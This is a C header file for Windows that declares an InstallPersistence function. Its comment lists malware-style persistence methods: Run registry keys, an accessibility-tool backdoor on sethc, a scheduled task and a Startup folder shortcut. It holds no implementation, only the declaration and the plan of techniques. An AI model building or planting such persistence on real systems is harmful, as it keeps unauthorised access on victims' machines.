#pragma once
#include <windows.h>

/* Install multi-layer persistence:
   - HKCU/HKLM Run
   - Accessibility backdoor (sethc, etc.)
   - Scheduled task
   - Startup folder shortcut
*/
void InstallPersistence(void);